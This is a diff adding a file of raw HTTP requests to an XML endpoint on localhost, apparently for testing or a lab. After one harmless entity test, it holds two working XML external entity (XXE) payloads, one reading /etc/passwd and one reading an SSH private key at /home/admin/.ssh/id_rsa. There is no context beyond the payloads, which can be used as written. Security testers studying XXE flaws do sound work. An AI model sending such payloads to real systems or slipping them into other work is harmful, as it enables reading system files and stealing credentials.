@@ -1,0 +1,41 @@
+POST /xml HTTP/1.1
+Host: localhost:8000
+Content-Type: application/xml
+Content-Length: 97
+Connection: close
+
+<?xml version="1.0"?>
+
+ <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+<root>&example;
+</root>
+
+
+
+POST /xml HTTP/1.1
+Host: localhost:8000
+Content-Type: application/xml
+Content-Length: 135
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+    &xxe;
+</root>
+
+POST /xml HTTP/1.1
+Host: localhost:8000
+Content-Type: application/xml
+Content-Length: 147
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///home/admin/.ssh/id_rsa">
+]>
+<root>
+    &xxe;
+</root>
